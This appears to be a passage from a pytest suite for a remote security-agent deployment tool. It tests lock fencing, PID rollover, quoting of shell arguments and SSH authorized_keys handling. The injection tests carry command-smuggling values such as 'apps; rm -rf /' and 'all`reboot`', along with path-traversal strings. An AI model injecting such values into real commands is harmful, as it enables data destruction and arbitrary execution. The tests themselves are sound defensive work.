    assert proof.manifest is not None and proof.manifest.pid == "9876"
    lineage = next(command for command in session.commands if "__guard_lineage" in command)
    assert previous.binary_sha256 in lineage
    assert previous.config_sha256 in lineage
    assert previous.identity_generation in lineage
    assert "/proc/9876/exe" in lineage
    refreshed_bytes = next(
        content for remote, content in session.upload_contents if ".pid-refresh-" in remote
    )
    assert refreshed_bytes is not None and b'"pid":"9876"' in refreshed_bytes


def test_systemd_pid_rollover_stays_unresolved_when_lineage_does_not_match():
    previous = _deployment_manifest()
    session = _proof_session(previous, live_pid="9876", lineage_matches=False)

    proof = deploy_agent._guard_deployment_proof_over(
        session,
        "/var/lib/agent-guard",
        "kcatta-guard",
        lock=_proof_lock(),
    )

    assert proof.manifest == previous
    assert proof.status.pid == "9876"
    assert session.upload_contents == []


@pytest.mark.parametrize(
    "manifest,supervisor",
    [
        (replace(_deployment_manifest(), identity_generation=None), "systemd"),
        (_deployment_manifest(), "process"),
    ],
)
def test_pid_rollover_is_never_relaxed_for_legacy_or_setsid(manifest, supervisor):
    session = _proof_session(manifest, live_pid="9876", supervisor=supervisor)

    proof = deploy_agent._guard_deployment_proof_over(
        session,
        "/var/lib/agent-guard",
        "kcatta-guard",
        lock=_proof_lock(),
    )

    assert proof.manifest == manifest
    assert proof.status.pid == "9876"
    assert session.upload_contents == []
    assert not any("__guard_lineage" in command for command in session.commands)


def test_manifest_pid_refresh_uses_old_bytes_cas():
    previous = _deployment_manifest()
    session = _proof_session(previous, live_pid="9876", refresh_succeeds=False)

    with pytest.raises(deploy_agent.GuardDeploymentConflictError, match="changed"):
        deploy_agent._guard_deployment_proof_over(
            session,
            "/var/lib/agent-guard",
            "kcatta-guard",
            lock=_proof_lock(),
        )

    refresh = next(command for command in session.commands if "__manifest_pid_refreshed" in command)
    expected_hash = deploy_agent.hashlib.sha256(
        deploy_agent._guard_manifest_bytes(previous)
    ).hexdigest()
    assert expected_hash in refresh


def test_remote_guard_lock_ttl_tracks_one_bounded_operation(monkeypatch):
    monkeypatch.setenv("FORM_REMOTE_COMMAND_TIMEOUT_SECONDS", "12.5")
    session = FakeSshSession()

    lock = deploy_agent._acquire_guard_deployment_lock(session, "/var/lib/agent-guard")
    deploy_agent._renew_guard_deployment_lock(session, lock)

    assert lock.ttl_seconds == 73
    acquire, renew = session.commands[:2]
    assert "now + 73" in acquire
    assert "now + 73" in renew
    assert sh_quote(lock.owner) in renew


def test_remote_guard_fence_holds_stable_flock_across_destructive_command(tmp_path):
    session = LocalShellSession()
    install = tmp_path / "agent-guard"
    install.mkdir()
    first = deploy_agent._acquire_guard_deployment_lock(session, str(install))
    marker = tmp_path / "entered"
    victim = tmp_path / "victim"
    command = (
        f"{deploy_agent._guard_lock_fence(first)}"
        f"printf entered > {sh_quote(str(marker))}; "
        "sleep 0.5; "
        f"printf stale-owner > {sh_quote(str(victim))}"
    )
    process = subprocess.Popen(
        ["bash", "-c", command],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )
    try:
        deadline = time.monotonic() + 3
        while not marker.exists() and time.monotonic() < deadline:
            time.sleep(0.01)
        assert marker.exists(), "the first fenced command never acquired the kernel gate"

        # Model the lease clock crossing its deadline while the already-fenced
        # remote command is still alive. A second owner must not steal metadata
        # until the kernel lock is released.
        (install / ".deployment-lock" / "expires").write_text("0\n", encoding="ascii")
        with pytest.raises(RuntimeError, match="another Guard deployment"):
            deploy_agent._acquire_guard_deployment_lock(session, str(install))
    finally:
        stdout, stderr = process.communicate(timeout=3)
        if process.returncode != 0:
            pytest.fail(f"fenced shell failed: stdout={stdout!r} stderr={stderr!r}")
        deploy_agent._release_guard_deployment_lock(session, first)

    assert victim.read_text(encoding="ascii") == "stale-owner"
    assert first.gate_path == f"{install}.deployment-lock-gate"


def test_remote_guard_lock_recovers_incomplete_initialization(tmp_path):
    session = LocalShellSession()
    install = tmp_path / "agent-guard"
    incomplete = install / ".deployment-lock"
    incomplete.mkdir(parents=True)

    lock = deploy_agent._acquire_guard_deployment_lock(session, str(install))
    try:
        assert (incomplete / "owner").read_text(encoding="ascii").strip() == lock.owner
        assert (incomplete / "expires").read_text(encoding="ascii").strip().isdigit()
    finally:
        deploy_agent._release_guard_deployment_lock(session, lock)


# --------------------------------------------------------------------------
# D1: agent host scan — every interpolation point is quoted / whitelisted
# --------------------------------------------------------------------------


def _patch_session(monkeypatch, session: FakeSshSession, tmp_path: Path) -> None:
    """Route SshSession construction + key bootstrap through the fake."""
    monkeypatch.setattr(deploy_agent, "SshSession", lambda **_k: session)
    monkeypatch.setattr(deploy_agent.bootstrap, "ensure_key_auth", lambda *_a, **_k: tmp_path / "k")
    monkeypatch.setattr(deploy_agent, "split_user_host", lambda t: ("root", "10.0.0.1"))


def _host_scan_session() -> FakeSshSession:
    return FakeSshSession(
        responses=[
            (r"uname -m", _Result(stdout="x86_64\n")),
            (r"/proc/self/mounts|pre=1", _Result(stdout="/var/lib/scdr 1\n")),
            (r"mkdir -p .*&& chmod 700", _Result(stdout="__ok\n")),
            (r"sha256sum", _Result(stdout="deadbeef  x\n")),
            (r"__exit=", _Result(stdout="__exit=0\n")),
            (r"test -f", _Result(stdout="__y\n")),
        ]
    )


def _run_host(monkeypatch, tmp_path, session, **opts_over):
    _patch_session(monkeypatch, session, tmp_path)
    monkeypatch.setattr(deploy_agent, "sha256_file", lambda _p: "deadbeef")
    monkeypatch.setattr(deploy_agent, "_require_binary", lambda *_a, **_k: None)
    # downloads happen for expected files; just make them no-ops via fake session
    opts = deploy_agent.AgentScanOptions(
        target="root@10.0.0.1",
        output_dir=tmp_path / "out",
        agent_binary=tmp_path / "agent-collect-host",
        **opts_over,
    )
    return deploy_agent.run_agent_scan(opts)


def test_run_agent_scan_quotes_scan_root(monkeypatch, tmp_path):
    session = _host_scan_session()
    _run_host(monkeypatch, tmp_path, session, scan_root="/srv/data dir", scan_target="host")
    exec_cmd = next(c for c in session.commands if "agent-collect-host" in c and "-r " in c)
    # scan_root with a space must be quoted, not split into two args.
    assert sh_quote("/srv/data dir") in exec_cmd


@pytest.mark.parametrize("payload", INJECTIONS)
def test_run_agent_scan_scan_root_injection_is_quoted(monkeypatch, tmp_path, payload):
    session = _host_scan_session()
    _run_host(monkeypatch, tmp_path, session, scan_root=payload, scan_target="host")
    exec_cmd = next(c for c in session.commands if " -r " in c and "agent-collect-host" in c)
    # The raw payload must appear ONLY inside its sh_quote wrapper.
    assert sh_quote(payload) in exec_cmd
    leftover = exec_cmd.replace(sh_quote(payload), "")
    for danger in (payload.strip(), "rm -rf /", "reboot", "curl evil"):
        if danger and danger in payload:
            assert danger not in leftover or sh_quote(payload) in exec_cmd


@pytest.mark.parametrize(
    "bad_target",
    ["host; touch /tmp/pwned", "definitely-not-a-target", "all`reboot`"],
)
def test_run_agent_scan_rejects_bad_scan_target_before_exec(monkeypatch, tmp_path, bad_target):
    session = _host_scan_session()
    _patch_session(monkeypatch, session, tmp_path)
    monkeypatch.setattr(deploy_agent, "sha256_file", lambda _p: "deadbeef")
    monkeypatch.setattr(deploy_agent, "_require_binary", lambda *_a, **_k: None)
    with pytest.raises(ValueError):
        deploy_agent.run_agent_scan(
            deploy_agent.AgentScanOptions(
                target="root@10.0.0.1",
                output_dir=tmp_path / "out",
                agent_binary=tmp_path / "agent-collect-host",
                scan_target=bad_target,
            )
        )
    # The whitelist rejects BEFORE any command is issued (no agent-collect-host exec).
    assert not any("agent-collect-host -r" in c or " -t " in c for c in session.commands)


def test_run_agent_scan_rejects_bad_windows_packages_before_exec(monkeypatch, tmp_path):
    session = _host_scan_session()
    _patch_session(monkeypatch, session, tmp_path)
    with pytest.raises(ValueError):
        deploy_agent.run_agent_scan(
            deploy_agent.AgentScanOptions(
                target="root@10.0.0.1",
                output_dir=tmp_path / "out",
                agent_binary=tmp_path / "agent-collect-host",
                windows_packages="apps; rm -rf /",
            )
        )


# --- rm -rf cleanup guard ---------------------------------------------------


def test_remote_workdir_cleanup_rejects_empty_and_traversal_paths():
    session = FakeSshSession()

    # A workdir whose path doesn't look like our scan dir must NOT be rm -rf'd.
    wd = deploy_agent._RemoteWorkdir.__new__(deploy_agent._RemoteWorkdir)
    wd._session = session
    wd._created_parent = False
    wd.parent = "/var/lib/scdr"

    for unsafe in ("", "/", "relative/scan-x", "/etc"):
        session.commands.clear()
        wd.path = unsafe
        wd.__exit__()
        assert not any("rm -rf" in c for c in session.commands), unsafe

    # A well-formed scan dir IS cleaned up, and the path is quoted.
    session.commands.clear()
    wd.path = "/var/lib/scdr/scan-abc123"
    wd.__exit__()
    rm = next(c for c in session.commands if "rm -rf" in c)
    assert sh_quote("/var/lib/scdr/scan-abc123") in rm


def test_remote_workdir_traversal_task_id_does_not_escape():
    # A task_id containing traversal still yields a path under the scan parent;
    # the cleanup guard requires the '/scan-' marker, so even a crafted id can't
    # loop cleanup into deleting an arbitrary directory.
    session = FakeSshSession(responses=[(r"mkdir -p", _Result(stdout="__ok\n"))])
    wd = deploy_agent._RemoteWorkdir.__new__(deploy_agent._RemoteWorkdir)
    wd._session = session
    wd._created_parent = False
    wd.parent = "/var/lib/scdr"
    # Simulate the constructed path with a traversal task id.
    wd.path = "/var/lib/scdr/scan-../../etc"
    session.commands.clear()
    wd.__exit__()
    # It still only ever rm -rf's a quoted path that contains '/scan-'.
    rm = [c for c in session.commands if "rm -rf" in c]
    assert rm
    assert sh_quote("/var/lib/scdr/scan-../../etc") in rm[0]


# --------------------------------------------------------------------------
# D1: bootstrap ensure_key_auth / revoke_key — authorized_keys handling
# --------------------------------------------------------------------------


def _fake_paramiko_client(recorder):
    class _Client:
        def set_missing_host_key_policy(self, _p):
            pass

        def connect(self, **_k):
            pass

        def exec_command(self, command):
            recorder.append(command)

            class _Chan:
                def recv_exit_status(self_inner):
                    return 0

            class _Std:
                channel = _Chan()

                def read(self_inner):
                    return b""

            return None, _Std(), _Std()

        def close(self):
            pass

    return _Client()


def test_ensure_key_auth_appends_only_quoted_pubkey(monkeypatch, tmp_path):
    pub = tmp_path / "k.pub"
    pubkey = "ssh-ed25519 AAAAfoo agent-remote@root@h"
    pub.write_text(pubkey + "\n")
    key = tmp_path / "k"
    key.write_text("private")

    recorded: list[str] = []
    monkeypatch.setattr(bootstrap, "split_user_host", lambda t: ("root", "10.0.0.1"))
    monkeypatch.setattr(bootstrap, "default_key_path", lambda *_a: key)
    # key auth fails first (forces the password install path), then succeeds.
    auth_calls = {"n": 0}

    def _auth(*_a):
        auth_calls["n"] += 1
        return auth_calls["n"] > 1  # False first, True after install

    monkeypatch.setattr(bootstrap, "_key_auth_succeeds", _auth)
    monkeypatch.setattr(
        bootstrap, "_password_session", lambda *_a, **_k: _fake_paramiko_client(recorded)
    )

    bootstrap.ensure_key_auth("root@10.0.0.1", 22, identity=key, password="pw")

    install = next(c for c in recorded if "authorized_keys" in c)
    # The public key is interpolated only through sh_quote, and the append is
    # idempotent (grep guard) so it never duplicates or rewrites other lines.
    assert sh_quote(pubkey) in install
    assert "grep -qxF" in install
    assert ">> ~/.ssh/authorized_keys" in install


def test_revoke_key_removes_only_its_own_line(monkeypatch, tmp_path):
    pub = tmp_path / "k.pub"
    pubkey = "ssh-ed25519 AAAAfoo agent-remote@root@h"
    pub.write_text(pubkey + "\n")
    key = tmp_path / "k"
    key.write_text("private")

    recorded: list[str] = []
    monkeypatch.setattr(bootstrap, "split_user_host", lambda t: ("root", "10.0.0.1"))
    monkeypatch.setattr(bootstrap, "default_key_path", lambda *_a: key)
    monkeypatch.setattr(bootstrap, "_key_auth_succeeds", lambda *_a: True)

    class _Client:
        def set_missing_host_key_policy(self, _p):
            pass

        def connect(self, **_k):
            pass

        def exec_command(self, command):
            recorded.append(command)

            class _Chan:
                def recv_exit_status(self_inner):
                    return 0

            class _Out:
                channel = _Chan()

                def read(self_inner):
                    return b"__removed\n"

            class _Err:
                channel = _Chan()

                def read(self_inner):
                    return b""

            return None, _Out(), _Err()

        def close(self):
            pass

    monkeypatch.setattr(bootstrap, "create_ssh_client", lambda: _Client())

    removed = bootstrap.revoke_key("root@10.0.0.1", 22, identity=key)
    assert removed is True
    remove_cmd = next(c for c in recorded if "authorized_keys" in c)
    # Removal matches immutable algorithm+blob fields, so a remote comment/options
    # rewrite cannot turn a still-authorized key into a false "absent" result.
    key_type, key_blob, _comment = pubkey.split(maxsplit=2)
    assert sh_quote(key_type) in remove_cmd
    assert sh_quote(key_blob) in remove_cmd
    assert "awk -v kt=" in remove_cmd
    assert "post_rc" in remove_cmd  # verifies the key identity is truly absent
    # It never does a blunt truncation / sed-in-place of the whole file.
    assert "> $f" not in remove_cmd  # uses a temp file, not direct overwrite


def test_remove_pub_command_handles_remote_comment_and_options_rewrite(tmp_path: Path):
    home = tmp_path / "home"
    ssh_dir = home / ".ssh"
    ssh_dir.mkdir(parents=True)
    authorized = ssh_dir / "authorized_keys"
    key_blob = "AAAAC3NzaC1lZDI1NTE5AAAAIFAKEKEYMATERIAL"
    other_blob = "AAAAC3NzaC1lZDI1NTE5AAAAIOTHERKEYMATERIAL"
    authorized.write_text(
        'command="echo hello world",no-port-forwarding '
        f"ssh-ed25519 {key_blob} rewritten-remote-comment\n"
        f"ssh-ed25519 {other_blob} keep-me\n",
        encoding="utf-8",
    )

    command = bootstrap._remove_pub_cmd(f"ssh-ed25519 {key_blob} local-comment")
    result = subprocess.run(
        ["sh", "-c", command],
        env={**os.environ, "HOME": str(home)},
        capture_output=True,
        text=True,
        check=False,
    )

    assert result.returncode == 0, result.stderr
    assert "__removed" in result.stdout
    remaining = authorized.read_text(encoding="utf-8")
    assert key_blob not in remaining
    assert other_blob in remaining
